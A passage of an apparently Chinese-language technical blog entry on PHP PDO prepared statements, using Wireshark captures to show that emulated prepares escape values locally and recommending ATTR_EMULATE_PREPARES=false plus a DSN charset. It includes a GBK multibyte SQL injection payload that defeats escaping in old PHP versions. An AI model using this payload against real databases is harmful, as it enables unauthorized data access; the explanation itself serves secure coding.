$conn-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); // set the PDO error mode to exception $st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;); $id = 21; $name = &apos;zhangsan&apos;; $st-&gt;bindParam(1,$id); $st-&gt;bindParam(2,$name); $st-&gt;execute(); $st-&gt;fetchAll(); ?&gt; 环境如下：PHP 5.4.7Mysql 协议版本 10MySQL Server 5.5.27为了彻底搞清楚php与mysql server通讯的细节，我特别使用了wireshark抓包进行研究之,安装wireshak之后，我们设置过滤条件为tcp.port==3306, 如下图：如此只显示与mysql 3306端口的通信数据，避免不必要的干扰。特别要注意的是wireshak基于wincap驱动，不支持本地环回接口的侦听（即使用php连接本地mysql的方法是无法侦听的），请连接其它机器（桥接网络的虚拟机也可）的MySQL进行测试。然后运行我们的PHP程序，侦听结果如下，我们发现，PHP只是简单地将SQL直接发送给MySQL Server :其实，这与我们平时使用mysql_real_escape_string将字符串进行转义，再拼接成SQL语句没有差别（只是由PDO本地驱动完成转义的），显然这种情况下还是有可能造成SQL注入的，也就是说在php本地调用pdo prepare中的mysql_real_escape_string来操作query，使用的是本地单字节字符集，而我们传递多字节编码的变量时，有可能还是会造成SQL注入漏洞(php 5.3.6以前版本的问题之一，这也就解释了为何在使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset的原因。针对php 5.3.6以前版本，以下代码仍然可能造成SQL注入问题： $pdo-&gt;query(&apos;SET NAMES GBK&apos;); $var = chr(0xbf) . chr(0x27) . &quot; OR 1=1 /*&quot;; $query = &quot;SELECT * FROM info WHERE name = ?&quot;; $stmt = $pdo-&gt;prepare($query); $stmt-&gt;execute(array($var)); 原因与上面的分析是一致的。而正确的转义应该是给mysql Server指定字符集，并将变量发送给MySQL Server完成根据字符转义。那么，如何才能禁止PHP本地转义而交由MySQL Server转义呢？PDO有一项参数，名为PDO::ATTR_EMULATE_PREPARES ，表示是否使用PHP本地模拟prepare，此项参数默认值未知。而且根据我们刚刚抓包分析结果来看，php 5.3.6+默认还是使用本地变量转，拼接成SQL发送给MySQL Server的，我们将这项值设置为false, 试试效果，如以下代码： &lt;?php $pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;&quot;,&quot;root&quot;); $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;); $id = 21; $name = &apos;zhangsan&apos;; $st-&gt;bindParam(1,$id); $st-&gt;bindParam(2,$name); $st-&gt;execute(); $st-&gt;fetchAll(); ?&gt; 红色行是我们刚加入的内容，运行以下程序，使用wireshark抓包分析，得出的结果如下：看到了吗？这就是神奇之处，可见这次PHP是将SQL模板和变量是分两次发送给MySQL的，由MySQL完成变量的转义处理，既然变量和SQL模板是分两次发送的，那么就不存在SQL注入的问题了，但需要在DSN中指定charset属性，如： $pdo = new PDO(&apos;mysql:host=localhost;dbname=test;charset=utf8&apos;, &apos;root&apos;); 参考文献：http://zhangxugg-163-com.iteye.com/blog/1835721]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
